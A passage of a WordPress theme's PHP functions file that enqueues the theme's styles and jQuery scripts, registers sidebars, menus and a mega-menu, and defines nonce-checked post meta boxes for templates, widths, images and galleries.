		padding-left: 5.7361376673%; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	h1.mvp-arch-head, h4.mvp-arch-head {
		font-size: 1.5rem;
		}
		
	h1.mvp-author-top-head {
		font-size: 2.8rem;
		}
		
	span.mvp-author-page-desc {
		font-size: 1rem;
		}
		
	.author h4.mvp-arch-head {
		padding-left: 5.7361376673%; /* 30 / 523 */
		}

	#mvp-nav-soc-title {
		max-width: 468px;
		}
		
	#mvp-nav-soc-title h4 {
		font-size: 12px;
		margin-top: 24px;
		}
		
	#mvp-post-feat2-text {
		padding: 0 15% 20px 4%;
		width: 81%;
		}
		
	#mvp-post-feat2-text span.mvp-post-cat {
		font-size: .8rem;
		}
		
	#mvp-post-feat2-text h1.mvp-post-title {
		font-size: 1.9rem;
		line-height: 123%;
		}
		
	.mvp-authors-list-left {
		margin-bottom: 30px;
		}
		
	.mvp-authors-list-left,
	.mvp-authors-list-right {
		margin-right: 0;
		width: 100%;
		}
		}
		";
	}
	}

	if ($mvp_customcss) {
	$mvp_customcss_css = "
 	$mvp_customcss
		";
	}
        wp_add_inline_style( 'mvp-custom-style', $mvp_theme_options );
	if (isset($mvp_rel_ad1_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_rel_ad1_css ); }
	if (isset($mvp_rel_ad2_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_rel_ad2_css ); }
	if (isset($mvp_rel_ad3_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_rel_ad3_css ); }
	if (isset($mvp_cont_read1_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_cont_read1_css ); }
	if (isset($mvp_cont_read2_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_cont_read2_css ); }
	if (isset($mvp_logo_loc_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_logo_loc_css ); }
	if (isset($mvp_feat_posts_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_feat_posts_css ); }
	if (isset($mvp_featured_cat_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_featured_cat_css ); }
	if (isset($mvp_post_temp1_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_post_temp1_css ); }
	if (isset($mvp_img_loc_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_img_loc_css ); }
	if (isset($mvp_post_width_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_post_width_css ); }
	if (isset($mvp_infinite_scroll_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_infinite_scroll_css ); }
	if (isset($mvp_wall_ad_css)) { wp_add_inline_style( 'mvp-custom-style', $mvp_wall_ad_css ); }
	if (isset($mvp_customcss_css)) { wp_kses_post(wp_add_inline_style( 'mvp-custom-style', $mvp_customcss_css )); }
}
}
add_action( 'wp_enqueue_scripts', 'mvp_styles_method' );

/////////////////////////////////////
// Enqueue Javascript/CSS Files
/////////////////////////////////////

if ( ! function_exists( 'mvp_scripts_method' ) ) {
function mvp_scripts_method() {
	global $wp_styles;
	wp_enqueue_style( 'mvp-reset', get_template_directory_uri() . '/css/reset.css' );
	wp_enqueue_style( 'fontawesome', get_stylesheet_directory_uri() . '/font-awesome/css/font-awesome.css' );
	wp_enqueue_style( 'mvp-iecss', get_stylesheet_directory_uri() . '/css/iecss.css', array( 'mvp-style' )  );
	wp_enqueue_style( 'mvp-fonts', mvp_fonts_url(), array(), '1.0.0' );
	$wp_styles->add_data( 'mvp-iecss', 'conditional', 'lt IE 10' );
	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") { if (isset($mvp_rtl)) {
	wp_enqueue_style( 'mvp-rtl', get_template_directory_uri() . '/css/rtl.css' );
	} }
	$mvp_respond = get_option('mvp_respond'); if ($mvp_respond == "true") { if (isset($mvp_respond)) {
	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") { if (isset($mvp_rtl)) {
	wp_enqueue_style( 'mvp-media-queries', get_template_directory_uri() . '/css/media-queries-rtl.css' );
	} } else {
	wp_enqueue_style( 'mvp-media-queries', get_template_directory_uri() . '/css/media-queries.css' );
	} } }
	wp_register_script('mvp-custom', get_template_directory_uri() . '/js/mvpcustom.js', array('jquery'), '', true);
	wp_register_script('clickmag', get_template_directory_uri() . '/js/scripts.js', array('jquery'), '', true);
	wp_register_script('retina', get_template_directory_uri() . '/js/retina.js', array('jquery'), '', true);
	wp_register_script('flexslider', get_template_directory_uri() . '/js/flexslider.js', array('jquery'), '', true);
	wp_register_script('infinitescroll', get_template_directory_uri() . '/js/jquery.infinitescroll.min.js', array('jquery'), '', true);
	wp_enqueue_script('clickmag');
	wp_enqueue_script('retina');
	wp_enqueue_script('mvp-custom');
	if ( is_single() ) wp_enqueue_script( 'flexslider' );
	$mvp_infinite_scroll = get_option('mvp_infinite_scroll'); if ($mvp_infinite_scroll == "true") { if (isset($mvp_infinite_scroll)) {
	wp_enqueue_script('infinitescroll');
	} }

	if ( is_singular() ) wp_enqueue_script( 'comment-reply' );

	if ( is_single() ) {
	wp_add_inline_script( 'mvp-custom', '
	jQuery(document).ready(function($) {
  	$(window).load(function(){
	var aboveHeight = $("#mvp-head-top").outerHeight();
	var previousScroll = 0;
	    $(window).scroll(function(event){
			var scroll = $(this).scrollTop();
			var elementOffset = $("#mvp-post-content-mid").offset().top;
			var distance = (elementOffset - scroll);
	    	if ($(window).scrollTop() > aboveHeight){
	    		$("#mvp-nav-wrap").addClass("mvp-fixed").css("top","0");
	    		$("#mvp-main-wrap").addClass("mvp-fixed-next");
	    		if(scroll < previousScroll) {
					$(".mvp-fly-top").addClass("mvp-to-top");
				} else {
					$(".mvp-fly-top").removeClass("mvp-to-top");
				}
	    	} else {
	    		$("#mvp-nav-wrap").removeClass("mvp-fixed");
	    		$("#mvp-main-wrap").removeClass("mvp-fixed-next");
	    		$(".mvp-fly-top").removeClass("mvp-to-top");
	    	}
	    	if (distance < 60){
	    		if(scroll > previousScroll) {
					$("#mvp-nav-soc-bar").addClass("mvp-nav-soc-down");
				} else {
					$("#mvp-nav-soc-bar").removeClass("mvp-nav-soc-down");
				}
			}
			previousScroll = scroll;
		});
	});
	});
	' );
	} else {
	wp_add_inline_script( 'mvp-custom', '
	jQuery(document).ready(function($) {
	$(window).load(function(){
	var aboveHeight = $("#mvp-head-top").outerHeight();
	$(window).scroll(function(event){
	    	if ($(window).scrollTop() > aboveHeight){
	    		$("#mvp-nav-wrap").addClass("mvp-fixed").css("top","0");
	    		$("#mvp-main-wrap").addClass("mvp-fixed-next");
			$(".mvp-fly-top").addClass("mvp-to-top");
	    	} else {
	    		$("#mvp-nav-wrap").removeClass("mvp-fixed");
	    		$("#mvp-main-wrap").removeClass("mvp-fixed-next");
	    		$(".mvp-fly-top").removeClass("mvp-to-top");
	    	}
	});
	});
	});
	' );
	}

	wp_add_inline_script( 'mvp-custom', '
	jQuery(document).ready(function($) {
	// Main Menu Dropdown Toggle
	$(".menu-item-has-children a").click(function(event){
	  event.stopPropagation();
	  location.href = this.href;
  	});

	$(".menu-item-has-children").click(function(){
    	  $(this).addClass("toggled");
    	  if($(".menu-item-has-children").hasClass("toggled"))
    	  {
    	  $(this).children("ul").toggle();
	  $(".mvp-fly-nav-menu").getNiceScroll().resize();
	  }
	  $(this).toggleClass("tog-minus");
    	  return false;
  	});

	// Main Menu Scroll
	$(window).load(function(){
	  $(".mvp-fly-nav-menu").niceScroll({cursorcolor:"#888",cursorwidth: 7,cursorborder: 0,zindex:999999});
	});
	});
	' );

	$mvp_infinite_scroll = get_option('mvp_infinite_scroll');
	if ($mvp_infinite_scroll == "true") { if (isset($mvp_infinite_scroll)) {
	wp_add_inline_script( 'mvp-custom', '
	jQuery(document).ready(function($) {
	$(".infinite-content").infinitescroll({
	  navSelector: ".mvp-nav-links",
	  nextSelector: ".mvp-nav-links a:first",
	  itemSelector: ".infinite-post",
	  errorCallback: function(){ $(".mvp-inf-more-but").css("display", "none") }
	});
	$(window).unbind(".infscr");
	$(".mvp-inf-more-but").click(function(){
   		$(".infinite-content").infinitescroll("retrieve");
        	return false;
	});
	$(window).load(function(){
		if ($(".mvp-nav-links a").length) {
			$(".mvp-inf-more-but").css("display","inline-block");
		} else {
			$(".mvp-inf-more-but").css("display","none");
		}
	});
	});
	' );
	}
	}

	if ( is_single() ) {
	global $post; $mvp_show_gallery = get_post_meta($post->ID, "mvp_post_gallery", true);
	if ($mvp_show_gallery == "show") {
	wp_add_inline_script( 'mvp-custom', '
	jQuery(document).ready(function($) {
	$(window).load(function() {
	  $(".mvp-post-gallery-bot").flexslider({
	    animation: "slide",
	    controlNav: false,
	    animationLoop: true,
	    slideshow: false,
	    itemWidth: 80,
	    itemMargin: 10,
	    asNavFor: ".mvp-post-gallery-top"
	  });

	  $(".mvp-post-gallery-top").flexslider({
	    animation: "fade",
	    controlNav: false,
	    animationLoop: true,
	    slideshow: false,
	    	  prevText: "&lt;",
	          nextText: "&gt;",
	    sync: ".mvp-post-gallery-bot"
	  });
	});
	});
	' );
	}
	}

}
}
add_action('wp_enqueue_scripts', 'mvp_scripts_method');

/////////////////////////////////////
// Register Widgets
/////////////////////////////////////

if ( !function_exists( 'mvp_sidebars_init' ) ) {
	function mvp_sidebars_init() {

		register_sidebar(array(
			'id' => 'mvp-home-sidebar-widget',
			'name' => esc_html__( 'Homepage Sidebar Widget Area', 'click-mag' ),
			'before_widget' => '<section id="%1$s" class="mvp-side-widget %2$s">',
			'after_widget' => '</section>',
			'before_title' => '<h4 class="mvp-side-widget-head left">',
			'after_title' => '</h4>',
		));

		register_sidebar(array(
			'id' => 'mvp-sidebar-widget',
			'name' => esc_html__( 'Default Sidebar Widget Area', 'click-mag' ),
			'before_widget' => '<section id="%1$s" class="mvp-side-widget %2$s">',
			'after_widget' => '</section>',
			'before_title' => '<h4 class="mvp-side-widget-head left">',
			'after_title' => '</h4>',
		));

		register_sidebar(array(
			'id' => 'mvp-sidebar-widget-post',
			'name' => esc_html__( 'Post/Page Sidebar Widget Area', 'click-mag' ),
			'before_widget' => '<section id="%1$s" class="mvp-side-widget %2$s">',
			'after_widget' => '</section>',
			'before_title' => '<h4 class="mvp-side-widget-head left">',
			'after_title' => '</h4>',
		));

		register_sidebar(array(
			'id' => 'mvp-sidebar-woo-widget',
			'name' => esc_html__( 'WooCommerce Sidebar Widget Area', 'click-mag' ),
			'before_widget' => '<section id="%1$s" class="mvp-side-widget %2$s">',
			'after_widget' => '</section>',
			'before_title' => '<h4 class="mvp-side-widget-head left">',
			'after_title' => '</h4>',
		));

	}
}
add_action( 'widgets_init', 'mvp_sidebars_init' );

include( get_template_directory() . '/widgets/widget-ad.php');
include( get_template_directory() . '/widgets/widget-authors.php');
include( get_template_directory() . '/widgets/widget-catlist.php');
include( get_template_directory() . '/widgets/widget-facebook.php');
include( get_template_directory() . '/widgets/widget-pop.php');
include( get_template_directory() . '/widgets/widget-taglist.php');
include( get_template_directory() . '/widgets/widget-tags.php');

/////////////////////////////////////
// Register Custom Menus
/////////////////////////////////////

if ( !function_exists( 'register_menus' ) ) {
function register_menus() {
	register_nav_menus(
		array(
			'main-menu' => esc_html__( 'Main Menu', 'click-mag' ),
			'mobile-menu' => esc_html__( 'Fly-Out Menu', 'click-mag' ),
			'footer-menu' => esc_html__( 'Footer Menu', 'click-mag' ))
	  	);
	  }
}
add_action( 'init', 'register_menus' );

/////////////////////////////////////
// Register Mega Menu
/////////////////////////////////////

add_filter( 'walker_nav_menu_start_el', 'wpse63345_walker_nav_menu_start_el', 10, 4 );

function wpse63345_walker_nav_menu_start_el( $item_output, $item, $depth, $args ) {
	global $wp_query;
    // The mega dropdown only applies to the main navigation.
    // Your theme location name may be different, "main" is just something I tend to use.
    if ( 'main-menu' !== $args->theme_location )
        return $item_output;

    // The mega dropdown needs to be added to one specific menu item.
    // I like to add a custom CSS class for that menu via the admin area.
    // You could also do an item ID check.
    if ( in_array( 'mvp-mega-dropdown', $item->classes ) ) {
        global $wp_query;
        global $post;
        $subposts = get_posts( 'numberposts=5&cat=' . $item->object_id );
	$item_output .= '<div class="mvp-mega-dropdown"><ul class="mvp-mega-list">';
            foreach( $subposts as $post ) :
                setup_postdata( $post );
		if ( has_post_format( 'video' )) {
                $item_output .= '<li><a href="'. get_permalink( $post->ID ) .'"><div class="mvp-mega-img">';
		$item_output .= get_the_post_thumbnail( $post->ID, 'mvp-mid-thumb' );
		$item_output .= '<div class="mvp-feat-vid-but"><i class="fa fa-play fa-3"></i></div></div>';
		$item_output .= get_the_title( $post->ID );
                $item_output .= '</a></li>';
		} else if ( has_post_format( 'gallery' )) {
                $item_output .= '<li><a href="'. get_permalink( $post->ID ) .'"><div class="mvp-mega-img">';
		$item_output .= get_the_post_thumbnail( $post->ID, 'mvp-mid-thumb' );
		$item_output .= '<div class="mvp-feat-gal-but"><i class="fa fa-camera fa-3"></i></div></div>';
		$item_output .= get_the_title( $post->ID );
                $item_output .= '</a></li>';
		} else {
                $item_output .= '<li><a href="'. get_permalink( $post->ID ) .'"><div class="mvp-mega-img">';
		$item_output .= get_the_post_thumbnail( $post->ID, 'mvp-mid-thumb' );
		$item_output .= '</div>';
		$item_output .= get_the_title( $post->ID );
                $item_output .= '</a></li>';
		}
            endforeach;
	$item_output .= '</ul></div>';

    }

    return $item_output;
}

/////////////////////////////////////
// Register Custom Background
/////////////////////////////////////

$custombg = array(
	'default-color' => 'ffffff',
);
add_theme_support( 'custom-background', $custombg );

/////////////////////////////////////
// Register Thumbnails
/////////////////////////////////////

if ( function_exists( 'add_theme_support' ) ) {
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 1000, 600, true );
add_image_size( 'mvp-post-thumb', 1000, 600, true );
add_image_size( 'mvp-mid-thumb', 400, 240, true );
add_image_size( 'mvp-small-thumb', 100, 100, true );
}

/////////////////////////////////////
// Title Meta Data
/////////////////////////////////////

add_theme_support( 'title-tag' );

function mvp_filter_home_title(){
if ( ( is_home() && ! is_front_page() ) || ( ! is_home() && is_front_page() ) ) {
    $mvpHomeTitle = get_bloginfo( 'name', 'display' );
    $mvpHomeDesc = get_bloginfo( 'description', 'display' );
    return $mvpHomeTitle . " - " . $mvpHomeDesc;
}
}
add_filter( 'pre_get_document_title', 'mvp_filter_home_title');

/////////////////////////////////////
// Add Custom Meta Box
/////////////////////////////////////

/* Fire our meta box setup function on the post editor screen. */
add_action( 'load-post.php', 'mvp_post_meta_boxes_setup' );
add_action( 'load-post-new.php', 'mvp_post_meta_boxes_setup' );

/* Meta box setup function. */
if ( !function_exists( 'mvp_post_meta_boxes_setup' ) ) {
function mvp_post_meta_boxes_setup() {

	/* Add meta boxes on the 'add_meta_boxes' hook. */
	add_action( 'add_meta_boxes', 'mvp_add_post_meta_boxes' );

	/* Save post meta on the 'save_post' hook. */
	add_action( 'save_post', 'mvp_save_video_embed_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_featured_headline_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_photo_credit_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_post_template_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_post_width_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_img_loc_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_featured_image_meta', 10, 2 );
	add_action( 'save_post', 'mvp_save_post_gallery_meta', 10, 2 );
}
}

/* Create one or more meta boxes to be displayed on the post editor screen. */
if ( !function_exists( 'mvp_add_post_meta_boxes' ) ) {
function mvp_add_post_meta_boxes() {

	add_meta_box(
		'mvp-video-embed',			// Unique ID
		esc_html__( 'Video/Audio Embed', 'click-mag' ),		// Title
		'mvp_video_embed_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'normal',				// Context
		'high'					// Priority
	);

	add_meta_box(
		'mvp-featured-headline',			// Unique ID
		esc_html__( 'Featured Headline', 'click-mag' ),		// Title
		'mvp_featured_headline_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'normal',				// Context
		'high'					// Priority
	);

	add_meta_box(
		'mvp-photo-credit',			// Unique ID
		esc_html__( 'Featured Image Caption', 'click-mag' ),		// Title
		'mvp_photo_credit_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'normal',				// Context
		'high'					// Priority
	);

	add_meta_box(
		'mvp-post-template',			// Unique ID
		esc_html__( 'Post Template', 'click-mag' ),		// Title
		'mvp_post_template_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'side',					// Context
		'core'					// Priority
	);

	add_meta_box(
		'mvp-post-width',			// Unique ID
		esc_html__( 'Post Width', 'click-mag' ),		// Title
		'mvp_post_width_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'side',					// Context
		'core'					// Priority
	);

	add_meta_box(
		'mvp-img-loc',				// Unique ID
		esc_html__( 'Featured Image Location', 'click-mag' ),		// Title
		'mvp_img_loc_meta_box',			// Callback function
		'post',					// Admin page (or post type)
		'side',					// Context
		'core'					// Priority
	);

	add_meta_box(
		'mvp-featured-image',			// Unique ID
		esc_html__( 'Featured Image Show/Hide', 'click-mag' ),		// Title
		'mvp_featured_image_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'side',					// Context
		'core'					// Priority
	);

	add_meta_box(
		'mvp-post-gallery',			// Unique ID
		esc_html__( 'Post Gallery Show/Hide', 'click-mag' ),		// Title
		'mvp_post_gallery_meta_box',		// Callback function
		'post',					// Admin page (or post type)
		'side',					// Context
		'core'					// Priority
	);
}
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_featured_headline_meta_box' ) ) {
function mvp_featured_headline_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_featured_headline_meta', 'mvp_featured_headline_nonce' ); ?>

	<p>
		<label for="mvp-featured-headline"><?php esc_html_e( "Add a custom featured headline that will be displayed in the featured slider.", 'click-mag' ); ?></label>
		<br />
		<input class="widefat" type="text" name="mvp-featured-headline" id="mvp-featured-headline" value="<?php echo esc_html( get_post_meta( $object->ID, 'mvp_featured_headline', true ) ); ?>" size="30" />
	</p>

<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_video_embed_meta_box' ) ) {
function mvp_video_embed_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_video_embed_meta', 'mvp_video_embed_nonce' ); ?>

	<p>
		<label for="mvp-video-embed"><?php esc_html_e( "Enter your video or audio embed code.", 'click-mag' ); ?></label>
		<br />
		<input class="widefat" type="text" name="mvp-video-embed" id="mvp-video-embed" value="<?php echo esc_html( get_post_meta( $object->ID, 'mvp_video_embed', true ) ); ?>" />
	</p>

<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_photo_credit_meta_box' ) ) {
function mvp_photo_credit_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_photo_credit_meta', 'mvp_photo_credit_nonce' ); ?>

	<p>
		<label for="mvp-photo-credit"><?php esc_html_e( "Add a caption and/or photo credit information for the featured image.", 'click-mag' ); ?></label>
		<br />
		<input class="widefat" type="text" name="mvp-photo-credit" id="mvp-photo-credit" value="<?php echo esc_html( get_post_meta( $object->ID, 'mvp_photo_credit', true ) ); ?>" size="30" />
	</p>

<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_post_template_meta_box' ) ) {
function mvp_post_template_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_post_template_meta', 'mvp_post_template_nonce' ); $selected = esc_html( get_post_meta( $object->ID, 'mvp_post_template', true ) ); ?>

	<p>
		<label for="mvp-post-template"><?php esc_html_e( "Select a template for your post.", 'click-mag' ); ?></label>
		<br /><br />
		<select class="widefat" name="mvp-post-template" id="mvp-post-template">
			<?php $mvp_post_layout = get_option('mvp_post_layout'); if($mvp_post_layout == 'Template 2') { ?>
				<option value="temp2" <?php selected( $selected, 'temp2' ); ?>>Template 2</option>
			<?php } else { ?>
				<option value="temp1" <?php selected( $selected, 'temp1' ); ?>>Template 1</option>
			<?php } ?>
			<?php $mvp_post_layout = get_option('mvp_post_layout'); if($mvp_post_layout !== 'Template 1') { ?>
            			<option value="temp1" <?php selected( $selected, 'temp1' ); ?>>Template 1</option>
			<?php } ?>
			<?php $mvp_post_layout = get_option('mvp_post_layout'); if($mvp_post_layout !== 'Template 2') { ?>
            			<option value="temp2" <?php selected( $selected, 'temp2' ); ?>>Template 2</option>
			<?php } ?>
        	</select>
	</p>
<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_post_width_meta_box' ) ) {
function mvp_post_width_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_post_width_meta', 'mvp_post_width_nonce' ); $selected = esc_html( get_post_meta( $object->ID, 'mvp_post_width', true ) ); ?>

	<p>
		<label for="mvp-post-width"><?php esc_html_e( "Select the width of your posts between Default and Full-Width.", 'click-mag' ); ?></label>
		<br /><br />
		<select class="widefat" name="mvp-post-width" id="mvp-post-width">
            		<option value="default" <?php selected( $selected, 'default' ); ?>>Default</option>
            		<option value="full" <?php selected( $selected, 'full' ); ?>>Full-Width</option>
        	</select>
	</p>
<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_img_loc_meta_box' ) ) {
function mvp_img_loc_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_img_loc_meta', 'mvp_img_loc_nonce' ); $selected = esc_html( get_post_meta( $object->ID, 'mvp_img_loc', true ) ); ?>

	<p>
		<label for="mvp-img-loc"><?php esc_html_e( "Select the location of your Featured Image between Large and Small.", 'click-mag' ); ?></label>
		<br /><br />
		<select class="widefat" name="mvp-img-loc" id="mvp-img-loc">
            		<option value="large" <?php selected( $selected, 'large' ); ?>>Large</option>
            		<option value="small" <?php selected( $selected, 'small' ); ?>>Small</option>
        	</select>
	</p>
<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_featured_image_meta_box' ) ) {
function mvp_featured_image_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_featured_image_meta', 'mvp_featured_image_nonce' ); $selected = esc_html( get_post_meta( $object->ID, 'mvp_featured_image', true ) ); ?>

	<p>
		<label for="mvp-featured-image"><?php esc_html_e( "Select to show or hide the featured image from automatically displaying in this post.", 'click-mag' ); ?></label>
		<br /><br />
		<select class="widefat" name="mvp-featured-image" id="mvp-featured-image">
            		<option value="show" <?php selected( $selected, 'show' ); ?>>Show</option>
            		<option value="hide" <?php selected( $selected, 'hide' ); ?>>Hide</option>
        	</select>
	</p>
<?php }
}

/* Display the post meta box. */
if ( !function_exists( 'mvp_post_gallery_meta_box' ) ) {
function mvp_post_gallery_meta_box( $object, $box ) { ?>

	<?php wp_nonce_field( 'mvp_save_post_gallery_meta', 'mvp_post_gallery_nonce' ); $selected = esc_html( get_post_meta( $object->ID, 'mvp_post_gallery', true ) ); ?>

	<p>
		<label for="mvp-post-gallery"><?php esc_html_e( "Select to show or hide the built-in gallery feature for this post.", 'click-mag' ); ?></label>
		<br /><br />
		<select class="widefat" name="mvp-post-gallery" id="mvp-post-gallery">
            		<option value="hide" <?php selected( $selected, 'hide' ); ?>>Hide</option>
            		<option value="show" <?php selected( $selected, 'show' ); ?>>Show</option>
        	</select>
	</p>
<?php }
}

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_video_embed_meta' ) ) {
function mvp_save_video_embed_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_video_embed_nonce'] ) || !wp_verify_nonce( $_POST['mvp_video_embed_nonce'], 'mvp_save_video_embed_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-video-embed'] ) ? balanceTags( $_POST['mvp-video-embed'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_video_embed';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_featured_headline_meta' ) ) {
function mvp_save_featured_headline_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_featured_headline_nonce'] ) || !wp_verify_nonce( $_POST['mvp_featured_headline_nonce'], 'mvp_save_featured_headline_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-featured-headline'] ) ? balanceTags( $_POST['mvp-featured-headline'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_featured_headline';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_photo_credit_meta' ) ) {
function mvp_save_photo_credit_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_photo_credit_nonce'] ) || !wp_verify_nonce( $_POST['mvp_photo_credit_nonce'], 'mvp_save_photo_credit_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-photo-credit'] ) ? balanceTags( $_POST['mvp-photo-credit'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_photo_credit';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_post_template_meta' ) ) {
function mvp_save_post_template_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_post_template_nonce'] ) || !wp_verify_nonce( $_POST['mvp_post_template_nonce'], 'mvp_save_post_template_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-post-template'] ) ? balanceTags( $_POST['mvp-post-template'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_post_template';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
	elseif ( '' == $new_meta_value && $meta_value )
		delete_post_meta( $post_id, $meta_key, $meta_value );
} }

/* Save the meta box's post metadata. */
if ( !function_exists( 'mvp_save_post_width_meta' ) ) {
function mvp_save_post_width_meta( $post_id, $post ) {

	/* Verify the nonce before proceeding. */
	if ( !isset( $_POST['mvp_post_width_nonce'] ) || !wp_verify_nonce( $_POST['mvp_post_width_nonce'], 'mvp_save_post_width_meta' ) )
		return $post_id;

	/* Get the post type object. */
	$post_type = get_post_type_object( $post->post_type );

	/* Check if the current user has permission to edit the post. */
	if ( !current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	/* Get the posted data and sanitize it for use as an HTML class. */
	$new_meta_value = ( isset( $_POST['mvp-post-width'] ) ? balanceTags( $_POST['mvp-post-width'] ) : '' );

	/* Get the meta key. */
	$meta_key = 'mvp_post_width';

	/* Get the meta value of the custom field key. */
	$meta_value = get_post_meta( $post_id, $meta_key, true );

	/* If a new meta value was added and there was no previous value, add it. */
	if ( $new_meta_value && '' == $meta_value )
		add_post_meta( $post_id, $meta_key, $new_meta_value, true );

	/* If the new meta value does not match the old value, update it. */
	elseif ( $new_meta_value && $new_meta_value != $meta_value )
		update_post_meta( $post_id, $meta_key, $new_meta_value );

	/* If there is no new meta value but an old value exists, delete it. */
